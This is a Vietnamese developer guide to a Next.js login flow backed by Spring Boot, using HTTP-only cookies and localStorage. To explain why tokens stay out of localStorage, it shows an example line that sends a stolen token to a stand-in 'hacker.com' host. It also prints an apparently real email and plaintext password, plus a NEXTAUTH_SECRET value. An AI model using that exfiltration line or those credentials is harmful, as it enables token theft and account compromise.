# 🔐 Giải Thích Chi Tiết: Login với Email + Password + Spring Boot Backend

khi vào điền email + password bấm login thì nó sẽ gửi thông tin này đi -> nó sẽ đến file 
---
cần file route.ts vì :

Vai trò của /api/auth/login/route.ts:

Tokens KHÔNG lưu localStorage - Nếu lưu localStorage sẽ bị XSS attack

HTTP-only cookies không thể bị JavaScript truy cập
Route này làm 3 việc:

✅ Nhận email/password từ frontend
✅ Forward tới backend (proxy layer)
✅ Set HTTP-only cookies cho tokens (server-side, bảo mật hơn)
Bảo mật: Backend không biết frontend là Next.js, route này che giấu backend

## 🎯 Tổng Quan

### Kiến Trúc Login Hiện Tại

```
┌─────────────────────────────────────────────────────────────┐
│                       Frontend (Next.js)                     │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  1. LoginForm Component                                     │
│     └─> User nhập email + password                          │
│         └─> Gọi authService.loginUser()                     │
│                                                              │
│  2. authService.ts (Service Layer)                          │
│     └─> Gọi fetch('/api/auth/login')                        │
│         └─> Forward email + password                        │
│                                                              │
│  3. /api/auth/login/route.ts (API Route)                    │
│     └─> Nhận email + password từ frontend                   │
│         └─> Forward tới backend Spring Boot                 │
│         └─> Set HTTP-Only Cookies (tokens)                  │
│         └─> Return user info                                │
│                                                              │
│  4. localStorage (Client Side Storage)                      │
│     └─> Lưu user info (không lưu tokens!)                   │
│                                                              │
│  5. useAuth Hook                                            │
│     └─> Lấy user info từ localStorage                       │
│     └─> Provide authentication state                        │
│                                                              │
│  6. Header Component                                        │
│     └─> Display avatar hoặc login button                    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
                            ↕ HTTP
┌─────────────────────────────────────────────────────────────┐
│                   Backend (Spring Boot)                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  POST /api/auth/login                                       │
│  └─> Validate email + password                              │
│      └─> Kiểm tra database                                  │
│          └─> Generate JWT tokens                            │
│              └─> Return: id, username, email, roles,        │
│                  accessToken, refreshToken, avatar          │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## 📁 Các File Liên Quan

### 📂 Frontend Files

| File | Vị Trí | Mục Đích | Quan Trọng |
|------|--------|---------|-----------|
| **loginForm.tsx** | `app/(auth)/login-page/` |                                      UI + xử lý submit form 
| **authService.ts** | `service/` |                                                   Logic gọi API + lưu data 
| **route.ts (login)** | `app/api/auth/login/`                                        | API endpoint forward | 
| **route.ts (logout)** | `app/api/auth/logout/`                                      | Clear HTTP-only cookies |
| **useAuth.ts** | `hooks/`                                                            | Hook để lấy user info 
| **header.tsx** | `app/components/layout/`                                           | Display avatar/login button 
| **login.schema.ts** | `app/(auth)/login-page/`                                      | Yup validation schema 
| **.env.local**                                                                      | Root | Environment variables |

---

## 🔄 Luồng Hoạt Động (Chi Tiết)

### Step 1️⃣: User Nhập Email + Password (LoginForm.tsx)

```
User fills: 
├─ Email: danhchobe25@gmail.com
├─ Password: Hoangle1912050
└─ Click "Sign In" button

↓

Validation (Yup Schema):
├─ Check email format
├─ Check password length
└─ If valid → Call onSubmit()

↓

onSubmit() function:
├─ gọi : authService.loginUser({email, password})
├─ Show loading state
└─ Handle error or success
```

**Code:**
```typescript
const onSubmit = async (values: LoginFormData) => {
  try {
    setLoading(true)
    setError(null)

    // 🔴 Step 1: Call authService
    const user = await authService.loginUser({
      email: values.email,
      password: values.password,
    })

    // 🔴 Step 2: Save user info
    authService.saveUserData(user)

    // 🔴 Step 3: Show success
    setSuccess(true)
    
    // 🔴 Step 4: Redirect
    setTimeout(() => {
      router.push('/dashboard-employers')
    }, 1500)
  } catch (err: any) {
    setError(err.message)
  } finally {
    setLoading(false)
  }
}
```

**Tại sao:**
- ✅ Validate trên frontend (UX tốt hơn)
- ✅ Loading state cho user feedback
- ✅ Error handling rõ ràng
- ✅ Delay redirect để user thấy success message

---

### Step 2️⃣: AuthService Gọi API Route (authService.ts)

```
authService.loginUser({email, password})

↓

Sanitize (trim) data:
├─ email.trim()
└─ password.trim()

↓

fetch('/api/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(credentials),
  credentials: 'include'  // 🔑 Browser sẽ gửi cookies
})

↓

Check response:
├─ If ok (200) → return user info
└─ If error (401, 500) → throw error
```

**Code:**
```typescript
export async function loginUser(credentials: LoginCredentials): Promise<AuthUser> {
  const sanitizedCredentials = {
    email: credentials.email.trim(),
    password: credentials.password.trim(),
  }

  try {
    console.log(`🚀 [authService] Calling /api/auth/login`)
    
    // 🔴 Gọi route.ts (KHÔNG gọi backend trực tiếp!)
    const response = await fetch('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(sanitizedCredentials),
      credentials: 'include', // 🔑 QUAN TRỌNG: gửi cookies
    })

    console.log(`📡 [authService] Response status: ${response.status}`)

    if (!response.ok) {
      const error = await response.json()
      throw new Error(error.message || 'Login failed')
    }

    const data = await response.json()
    return data.user  // 🔴 Return: {id, username, email, roles, avatar}
  } catch (error: any) {
    throw new Error(error.message)
  }
}
```

**Tại sao:**
- ✅ `credentials: 'include'` → Browser tự động gửi HTTP-only cookies
- ✅ Gọi `/api/auth/login` (route.ts) KHÔNG gọi backend trực tiếp
- ✅ Sanitize data để tránh whitespace issues
- ✅ Error handling rõ ràng

---

### Step 3️⃣: API Route Forward Tới Backend (route.ts)

```
POST /api/auth/login (route.ts nhận)

↓

Extract data:
├─ email
├─ password
└─ Check not null

↓

Forward tới backend Spring Boot:
├─ URL: http://localhost:8080/api/auth/login
├─ Method: POST
├─ Body: {email, password}
└─ Headers: {'Content-Type': 'application/json'}

↓

Backend trả về:
{
  id: 3,
  username: "lê nguyễn quốc hoàng",
  email: "danhchobe25@gmail.com",
  roles: ["Customers"],
  accessToken: "eyJhbGc...",
  refreshToken: "eyJhbGc...",
  avatar: "https://..."
}

↓

Set HTTP-Only Cookies:
├─ accessToken (1 hour)
│  ├─ httpOnly: true (JS không access được)
│  ├─ secure: true (HTTPS only in production)
│  ├─ sameSite: 'lax' (CSRF protection)
│  └─ maxAge: 3600
│
└─ refreshToken (7 days)
   ├─ httpOnly: true
   ├─ secure: true
   ├─ sameSite: 'lax'
   └─ maxAge: 7 * 24 * 3600

↓

Return JSON (CHỈ user info):
{
  user: {
    id: 3,
    username: "...",
    email: "...",
    roles: ["Customers"],
    avatar: "..."
  }
}
```

**Code:**
```typescript
export async function POST(req: NextRequest) {
  try {
    const { email, password } = await req.json()

    if (!email || !password) {
      return NextResponse.json(
        { message: 'Email and password required' },
        { status: 400 }
      )
    }

    // 🔴 Step 1: Gọi backend
    console.log(`🚀 Calling backend: ${API_URL}/auth/login`)
    
    const backendRes = await fetch(`${API_URL}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password }),
    })

    console.log(`📡 Backend response status: ${backendRes.status}`)

    if (!backendRes.ok) {
      const error = await backendRes.json()
      return NextResponse.json(
        { message: error.message || 'Login failed' },
        { status: backendRes.status }
      )
    }

    const data = await backendRes.json()

    // 🔴 Step 2: Create response
    const res = NextResponse.json(
      {
        user: {
          id: data.id,
          email: data.email,
          username: data.username,
          roles: data.roles,
          avatar: data.avatar,
        },
      },
      { status: 200 }
    )

    // 🔴 Step 3: Set HTTP-Only Cookies
    res.cookies.set('accessToken', data.accessToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax',
      maxAge: 3600,
      path: '/',
    })

    if (data.refreshToken) {
      res.cookies.set('refreshToken', data.refreshToken, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'lax',
        maxAge: 7 * 24 * 3600,
        path: '/',
      })
    }

    console.log(`✅ [login] HTTP-only cookies set, returning user info`)
    return res
  } catch (error: any) {
    console.error('Login error:', error)
    return NextResponse.json(
      { message: 'Login failed: ' + error.message },
      { status: 500 }
    )
  }
}
```

**Tại sao:**
- ✅ Backend set tokens ở route.ts (không ở frontend)
- ✅ `httpOnly: true` → XSS safe (malicious JS không thể steal tokens)
- ✅ `secure: true` → HTTPS only (man-in-the-middle safe)
- ✅ `sameSite: 'lax'` → CSRF protection
- ✅ CHỈ return user info, KHÔNG return tokens (already ở cookies)

---

### Step 4️⃣: Lưu User Info Vào localStorage (authService.ts)

```
saveUserData(user) được gọi

↓

Extract user info:
├─ userId
├─ username
├─ email
├─ roles
└─ avatar

↓

Save vào localStorage:
localStorage.setItem('userId', '3')
localStorage.setItem('username', 'lê nguyễn quốc hoàng')
localStorage.setItem('email', 'danhchobe25@gmail.com')
localStorage.setItem('roles', '["Customers"]')
localStorage.setItem('avatar', 'https://...')

↓

Result trong localStorage:
{
  userId: "3",
  username: "lê nguyễn quốc hoàng",
  email: "danhchobe25@gmail.com",
  roles: '["Customers"]',
  avatar: "https://..."
}
```

**Code:**
```typescript
export function saveUserData(user: AuthUser): void {
  if (typeof window === 'undefined') return

  localStorage.setItem('userId', user.id.toString())
  localStorage.setItem('username', user.username)
  localStorage.setItem('email', user.email)
  localStorage.setItem('roles', JSON.stringify(user.roles))
  if (user.avatar) {
    localStorage.setItem('avatar', user.avatar)
  }
  
  console.log(`💾 [authService] User data saved to localStorage`)
}
```

**Tại sao:**
- ✅ localStorage là persistent (không mất khi refresh page)
- ✅ Lưu user info (KHÔNG lưu tokens - đó là việc của HTTP-only cookies)
- ✅ JSON.stringify cho arrays
- ✅ Check `window === 'undefined'` cho SSR safety

---

### Step 5️⃣: useAuth Hook Lấy User Info (useAuth.ts)

```
useAuth() được gọi từ Header component

↓

useEffect mount:
├─ Call: authService.getCurrentUser()
├─ Get từ localStorage
├─ Set state
└─ Return user

↓

getCurrentUser() logic:
├─ Get từ localStorage:
│  ├─ userId
│  ├─ username
│  ├─ email
│  ├─ roles
│  └─ avatar
├─ If no userId/username → return null
└─ Parse JSON + return AuthUser object

↓

Return Hook:
{
  user: { id, username, email, roles, avatar },
  loading: false,
  isAuthenticated: true,
  logout: async () => {...}
}
```

**Code:**
```typescript
export function useAuth(): Auth {
  const [user, setUser] = useState<AuthUser | null>(null)
  const [loading, setLoading] = useState(true)
  const router = useRouter()

  useEffect(() => {
    // 🔴 Lấy từ localStorage
    const currentUser = authService.getCurrentUser()
    setUser(currentUser)
    setLoading(false)
  }, [])

  const logout = async () => {
    console.log('🚪 [useAuth] Logging out...')
    await authService.logout()
    setUser(null)
    router.push('/')
  }

  return {
    user,
    loading,
    isAuthenticated: !!user,
    logout,
  }
}
```

**Tại sao:**
- ✅ useEffect chạy 1 lần khi component mount
- ✅ dependency array rỗng = chỉ chạy 1 lần
- ✅ Lấy từ localStorage thay vì gọi API (nhanh hơn)
- ✅ Logout clear localStorage + cookies

---

### Step 6️⃣: Header Hiển Thị Avatar (header.tsx)

```
Header component render

↓

Check useAuth():
├─ If loading → show loading
├─ If isAuthenticated && user → show avatar
└─ Else → show login button

↓

If authenticated:
├─ Display avatar image:
│  ├─ src: user.avatar || '/image/avatarNull/avatarNull.jpg'
│  ├─ shape: rounded-full (hình tròn)
│  └─ border: border-[#ff5528]
│
└─ Click avatar → toggle dropdown menu:
   ├─ Show user info (username + email)
   ├─ Link: Dashboard
   └─ Button: Logout

↓

If not authenticated:
└─ Display login button:
   ├─ Text: "Đăng nhập"
   ├─ Link: /login-page
   └─ Icon: User icon
```

**Code:**
```typescript
{/* User Avatar or Login Button */}
{!loading && isAuthenticated && user ? (
  <div className="relative">
    <button
      onClick={() => setShowUserMenu(!showUserMenu)}
      className="relative w-10 h-10 rounded-full border-2 border-[#ff5528] overflow-hidden"
    >
      <Image
        src={user.avatar || '/image/avatarNull/avatarNull.jpg'}
        alt={user.username}
        fill
        className="object-cover"
        priority
      />
    </button>

    {/* Dropdown Menu */}
    {showUserMenu && (
      <div className="absolute right-0 top-12 w-52 bg-white shadow-2xl rounded-lg z-50">
        <div className="px-4 py-3 border-b">
          <p className="font-semibold">{user.username}</p>
          <p className="text-xs text-gray-600">{user.email}</p>
        </div>
        <Link href="/dashboard-employers" className="block px-4 py-3">
          Dashboard
        </Link>
        <button
          onClick={async () => {
            setShowUserMenu(false)
            await logout()
          }}
          className="w-full text-left px-4 py-3 text-red-600"
        >
          Logout
        </button>
      </div>
    )}
  </div>
) : (
  <Link href="/login-page" className="px-4 py-2 rounded-full">
    <User className="w-5 h-5" />
    <span>Đăng nhập</span>
  </Link>
)}
```

**Tại sao:**
- ✅ `conditional rendering` = show avatar hoặc login button
- ✅ `rounded-full` + Image = avatar hình tròn
- ✅ Fallback avatar nếu user.avatar null
- ✅ Dropdown menu onClick toggle state

---

## 📝 Chi Tiết Từng File

### 1. login.schema.ts (Validation)

**File:** `app/(auth)/login-page/login.schema.ts`

**Mục Đích:** Define validation rules for form

**Chi Tiết:**
```typescript
import * as yup from 'yup'

export const SchemaLogin = yup.object({
  email: yup
    .string()
    .required('Please enter your email!')
    .email('Invalid email format'),

  password: yup
    .string()
    .required('Please enter your password')
    .min(6, 'Password must be at least 6 characters long')
    .max(50, 'Password must be less than 50 characters'),
})

export type LoginFormData = yup.InferType<typeof SchemaLogin>
```

**Tại sao:**
- ✅ Validate trên frontend trước khi gửi backend
- ✅ UX tốt hơn (feedback ngay)
- ✅ Giảm request thừa tới backend

---

### 2. loginForm.tsx (UI + Logic)

**File:** `app/(auth)/login-page/loginForm.tsx`

**Mục Đích:** HTML form + handle submit + show errors

**Chi Tiết:**
```typescript
'use client'

import { useForm } from 'react-hook-form'
import { yupResolver } from '@hookform/resolvers/yup'
import { SchemaLogin, type LoginFormData } from './login.schema'
import { useState } from 'react'
import { useRouter } from 'next/navigation'
import { authService } from '@/service/authService'

export default function LoginForm() {
  const router = useRouter()
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState<string | null>(null)
  const [success, setSuccess] = useState(false)

  const { register, handleSubmit, formState: { errors } } = useForm<LoginFormData>({
    resolver: yupResolver(SchemaLogin),
  })

  const onSubmit = async (values: LoginFormData) => {
    try {
      setLoading(true)
      setError(null)

      // 🔴 Call authService
      const user = await authService.loginUser({
        email: values.email,
        password: values.password,
      })

      // 🔴 Save user info
      authService.saveUserData(user)

      setSuccess(true)
      
      // 🔴 Redirect after 1.5s
      setTimeout(() => {
        router.push('/dashboard-employers')
      }, 1500)
    } catch (err: any) {
      setError(err.message || 'Login failed')
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="w-full max-w-md">
      {/* Registration Form JSX */}
    </div>
  )
}
```

**Tại sao:**
- ✅ `useForm` + `yupResolver` = Validate automatically
- ✅ `loading state` = Disable button khi processing
- ✅ `success state` = Show success message before redirect
- ✅ `error state` = Show error message to user
- ✅ Delay redirect = Better UX (user sees success message)

---

### 3. authService.ts (Business Logic)

**File:** `service/authService.ts`

**Mục Đích:** Handle authentication API calls + data persistence

**Functions:**

#### a) loginUser()
```typescript
// Call /api/auth/login dengan email + password
// Return: AuthUser {id, username, email, roles, avatar}
// Throw error nếu login fail
```

**Tại sao:**
- ✅ Centralize API logic
- ✅ Reusable từ components khác
- ✅ Easy to test

#### b) saveUserData()
```typescript
// Save user info vào localStorage
// KHÔNG lưu tokens (đó là HTTP-only cookies)
```

**Tại sao:**
- ✅ localStorage persistent across page refresh
- ✅ User info accessible anywhere
- ✅ Tokens safe từ XSS

#### c) getCurrentUser()
```typescript
// Get user info từ localStorage
// Return: AuthUser hoặc null
```

**Tại sao:**
- ✅ Re-hydrate user on page load
- ✅ Avoid extra API calls
- ✅ Fast (no network request)

#### d) logout()
```typescript
// Clear localStorage + call /api/auth/logout
// /api/auth/logout sẽ delete cookies
```

**Tại sao:**
- ✅ Complete cleanup (localStorage + cookies)
- ✅ Prevent unauthorized access
- ✅ Safe logout

---

### 4. /api/auth/login/route.ts (API Route)

**File:** `app/api/auth/login/route.ts`

**Mục Đích:** Forward request từ frontend tới backend + set cookies

**Flow:**
```
POST /api/auth/login

1. Extract email + password
2. Validate required fields
3. Fetch từ backend: POST http://localhost:8080/api/auth/login
4. Check response status
5. Set HTTP-Only Cookies (accessToken, refreshToken)
6. Return user info (CHỈ!)
```

**Quy Trình Chi Tiết:**

```typescript
export async function POST(req: NextRequest) {
  try {
    const { email, password } = await req.json()

    // 🔴 Validation
    if (!email || !password) {
      return NextResponse.json(
        { message: 'Email and password required' },
        { status: 400 }
      )
    }

    // 🔴 Call backend
    const backendRes = await fetch(`${API_URL}/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password }),
    })

    // 🔴 Check response
    if (!backendRes.ok) {
      const error = await backendRes.json()
      return NextResponse.json(
        { message: error.message || 'Login failed' },
        { status: backendRes.status }
      )
    }

    const data = await backendRes.json()

    // 🔴 Create response with user info
    const res = NextResponse.json(
      {
        user: {
          id: data.id,
          email: data.email,
          username: data.username,
          roles: data.roles,
          avatar: data.avatar,
        },
      },
      { status: 200 }
    )

    // 🔴 Set HTTP-Only Cookies
    res.cookies.set('accessToken', data.accessToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax',
      maxAge: 3600, // 1 hour
      path: '/',
    })

    if (data.refreshToken) {
      res.cookies.set('refreshToken', data.refreshToken, {
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'lax',
        maxAge: 7 * 24 * 3600, // 7 days
        path: '/',
      })
    }

    return res
  } catch (error: any) {
    console.error('Login error:', error)
    return NextResponse.json(
      { message: 'Login failed: ' + error.message },
      { status: 500 }
    )
  }
}
```

**Tại sao:**
- ✅ **Proxy Pattern**: Frontend không gọi backend trực tiếp (CORS, credentials)
- ✅ **HTTP-Only Cookies**: Tokens an toàn từ XSS
- ✅ **Server-side**: Cookies set from server (more secure)
- ✅ **Validate**: Check required fields
- ✅ **Error Handling**: Clear error messages

---

### 5. /api/auth/logout/route.ts (Logout Route)

**File:** `app/api/auth/logout/route.ts`

**Mục Đích:** Clear cookies

```typescript
export async function POST(req: NextRequest) {
  const res = NextResponse.json(
    { message: 'Logged out successfully' },
    { status: 200 }
  )

  res.cookies.delete('accessToken')
  res.cookies.delete('refreshToken')

  return res
}
```

**Tại sao:**
- ✅ Server can delete HTTP-only cookies
- ✅ Frontend không thể delete (JS không access)
- ✅ Complete logout (localStorage + cookies)

---

### 6. useAuth.ts (Custom Hook)

**File:** `hooks/useAuth.ts`

**Mục Đích:** Provide authentication state to components

```typescript
export function useAuth(): Auth {
  const [user, setUser] = useState<AuthUser | null>(null)
  const [loading, setLoading] = useState(true)
  const router = useRouter()

  useEffect(() => {
    const currentUser = authService.getCurrentUser()
    setUser(currentUser)
    setLoading(false)
  }, [])

  const logout = async () => {
    await authService.logout()
    setUser(null)
    router.push('/')
  }

  return { user, loading, isAuthenticated: !!user, logout }
}
```

**Tại sao:**
- ✅ **Reusable**: Use anywhere, not just Header
- ✅ **Custom Logic**: Centralize auth state management
- ✅ **useEffect**: Load user on component mount
- ✅ **Dependencies**: Empty array = run once

---

### 7. header.tsx (UI Layer)

**File:** `app/components/layout/header.tsx`

**Mục Đích:** Display avatar or login button

```typescript
const { user, loading, isAuthenticated, logout } = useAuth()

// Then use conditional rendering:
{isAuthenticated && user ? (
  <Avatar onClick={logout} />
) : (
  <LoginButton />
)}
```

**Tại sao:**
- ✅ **Conditional Rendering**: Show different UI based on auth state
- ✅ **useAuth Hook**: Automatic re-render when state changes
- ✅ **Avatar Image**: Display user.avatar (cloudinary URL)
- ✅ **Logout Button**: Call logout function

---

### 8. .env.local (Configuration)

**File:** `.env.local` (Root)

```
NEXT_PUBLIC_API_URL=http://localhost:8080/api
NEXTAUTH_URL=http://localhost:3000
NEXTAUTH_SECRET=fcd2707b-e3e1-449d-a3a4-3ec3fd8edf18
```

**Tại sao:**
- ✅ **API_URL**: Backend endpoint
- ✅ **NEXTAUTH_URL**: Frontend URL (for cookies)
- ✅ **NEXTAUTH_SECRET**: Security key

---

## 🏗️ Thứ Tự Tạo/Chỉnh Sửa File

### 1️⃣ Setup (Prepare)
```
1. Create login.schema.ts          ← Validation rules
2. Setup .env.local                ← Config
```

### 2️⃣ Service Layer (Backend Integration)
```
3. Create authService.ts           ← Business logic
   └─ loginUser()
   └─ saveUserData()
   └─ getCurrentUser()
   └─ logout()
```

### 3️⃣ API Routes (Bridge)
```
4. Create /api/auth/login/route.ts  ← Forward to backend
5. Create /api/auth/logout/route.ts ← Clear cookies
```

### 4️⃣ Hooks (State Management)
```
6. Create useAuth.ts               ← Custom hook
```

### 5️⃣ UI Components (Frontend)
```
7. Create loginForm.tsx            ← Form component
8. Update header.tsx               ← Show avatar/login
```

### ✅ Done!

---

## 🤔 Tại Sao Là Cách Này

### 1. Tại Sao Dùng API Route (/api/auth/login)?

**Vấn đề nếu gọi backend trực tiếp:**
```
Frontend → Backend
││││││││││
❌ CORS error (browser security)
❌ credentials không gửi được
❌ Cookies không set được
❌ Frontend expose backend URL
❌ No token security
```

**Giải pháp:**
```
Frontend → API Route → Backend
││││││││  ││││││││││  ││││││
✅ No CORS error (same origin)
✅ Credentials included automatically
✅ Cookies set server-side
✅ Backend hidden from frontend
✅ Tokens secured with httpOnly
```

---

### 2. Tại Sao Dùng HTTP-Only Cookies?

**localStorage:**
```javascript
const token = localStorage.getItem('token')
// ❌ Malicious script có thể:
const maliciousToken = localStorage.getItem('token')
fetch('https://hacker.com?token=' + maliciousToken)
// 💥 Token leaked!
```

**HTTP-Only Cookies:**
```
Browser automatically sends cookies with every request
JavaScript KHÔNG CÓ cách access
// ✅ XSS attack không thể steal
// ✅ CSRF protection available
// ✅ Secure flag (HTTPS only)
```

---

### 3. Tại Sao Lưu Vào localStorage?

```
❌ Lưu token ở localStorage:
   - XSS vulnerability

✅ Lưu user info ở localStorage:
   - User info không sensitive
   - Avoid extra API calls
   - Fast page load
   - Cookies handle token security
```

---

### 4. Tại Sao Separate loginUser() + saveUserData()?

```
❌ Combine vào 1 function:
   - Hard to test
   - Mixed responsibilities
   - Can't reuse logic

✅ Separate functions:
   - Single Responsibility
   - Testable
   - Reusable (can call saveUserData elsewhere)
   - Clear flow
```

---

### 5. Tại Sao Delay redirect (1.5s)?

```
// ❌ Immediate redirect:
router.push('/dashboard')
// User doesn't see success message

// ✅ Delay redirect:
setTimeout(() => {
  router.push('/dashboard')
}, 1500)
// User sees success feedback
```

---

### 6. Tại Sao Validate Trên Frontend?

```
❌ Only backend validate:
   - Extra network request
   - Slow user feedback
   - Bad UX

✅ Frontend validate:
   - Instant feedback
   - Better UX
   - Reduce server load
   - Backend STILL validates (security)
```

---

## 📊 Complete Flow Diagram

```
┌──────────────────────────────────────────────────────────────────┐
│                    User Interaction                              │
├──────────────────────────────────────────────────────────────────┤
│ 1. User fills email + password                                   │
│ 2. Click "Sign In"                                               │
└──────────────────────────────────────────────────────────────────┘
                            ↓
┌──────────────────────────────────────────────────────────────────┐
│  loginForm.tsx (handleSubmit)                                    │
├──────────────────────────────────────────────────────────────────┤
│ 1. Validate form with Yup schema                                 │
│ 2. Call: authService.loginUser({email, password})               │
│ 3. Show loading state                                            │
│ 4. Handle error or success                                       │
└──────────────────────────────────────────────────────────────────┘
                            ↓
┌──────────────────────────────────────────────────────────────────┐
│  authService.loginUser()                                        │
├──────────────────────────────────────────────────────────────────┤
│ 1. Sanitize credentials (trim)                                   │
│ 2. fetch('/api/auth/login', {..., credentials: 'include'})      │
│ 3. Return: { id, username, email, roles, avatar }               │
│ 4. Throw error if failed                                         │
└──────────────────────────────────────────────────────────────────┘
                            ↓
┌──────────────────────────────────────────────────────────────────┐
│  /api/auth/login/route.ts                                        │
├──────────────────────────────────────────────────────────────────┤
│ 1. Extract email, password                                       │
│ 2. fetch(backend: POST /api/auth/login)                          │
│ 3. Set HTTP-Only Cookies: accessToken, refreshToken             │
│ 4. Return: { user: {...} }  (CHỈ user info)                     │
└──────────────────────────────────────────────────────────────────┘
                            ↓
┌──────────────────────────────────────────────────────────────────┐
│  authService.saveUserData()                                      │
├──────────────────────────────────────────────────────────────────┤
│ 1. Save user info to localStorage                                │
│ 2. NOT tokens (cookies handle it)                                │
└──────────────────────────────────────────────────────────────────┘
                            ↓
┌──────────────────────────────────────────────────────────────────┐
│  loginForm.tsx (redirect)                                        │
├──────────────────────────────────────────────────────────────────┤
│ 1. Show success message (1.5s delay)                             │
│ 2. Redirect to /dashboard-employers                              │
└──────────────────────────────────────────────────────────────────┘
                            ↓
┌──────────────────────────────────────────────────────────────────┐
│  Dashboard Page                                                  │
├──────────────────────────────────────────────────────────────────┤
│ 1. useAuth() hook runs                                           │
│ 2. Get user from localStorage                                    │
│ 3. Show user-specific content                                    │
│ 4. Header shows avatar (not login button)                        │
└──────────────────────────────────────────────────────────────────┘
```

---

## 🔑 Key Takeaways

| Concept | Why | How |
|---------|-----|-----|
| **API Route (Proxy)** | Security + CORS | Frontend → Route → Backend |
| **HTTP-Only Cookies** | XSS Protection | Server sets, JS can't access |
| **localStorage** | Persistence | Store user info only |
| **useAuth Hook** | Reusability | Access auth anywhere |
| **Validation** | UX + Security | Frontend (UX) + Backend (security) |
| **Sanitize** | Data quality | trim() remove whitespace |
| **Delay Redirect** | UX Feedback | User sees success message |
| **Custom Hook** | Clean code | Extract logic from components |

---

## ✅ Checklist: Khi Implement Tính Năng Auth

- [ ] Tạo validation schema (Yup)
- [ ] Tạo authService (loginUser, saveUserData, getCurrentUser, logout)
- [ ] Tạo API route /api/auth/login (proxy + set cookies)
- [ ] Tạo API route /api/auth/logout (clear cookies)
- [ ] Tạo useAuth hook (custom hook)
- [ ] Tạo loginForm component (form + submit)
- [ ] Update header component (show avatar/login)
- [ ] Setup .env.local (API_URL)
- [ ] Test login flow end-to-end
- [ ] Test logout flow
- [ ] Check localStorage (user info saved)
- [ ] Check cookies (HTTP-only tokens)
- [ ] Check avatar display
- [ ] Test page refresh (user still logged in)

---

## 🎓 References

- **Next.js:** https://nextjs.org/
- **HTTP-Only Cookies:** https://owasp.org/www-community/attacks/csrf
- **JWT:** https://jwt.io/
- **Yup Validation:** https://github.com/jquense/yup
